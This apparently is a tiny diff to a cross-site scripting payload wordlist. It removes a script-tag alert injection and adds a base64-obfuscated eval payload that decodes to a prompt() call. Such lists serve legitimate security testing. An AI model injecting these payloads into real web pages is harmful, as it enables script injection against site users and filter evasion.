@@ -1,4 +1,1 @@
--------
-=======
-
-">&lt;script>alert(0);&lt;/script>
+eval(atob("cHJvbXB0KDU5KTs%3D"))
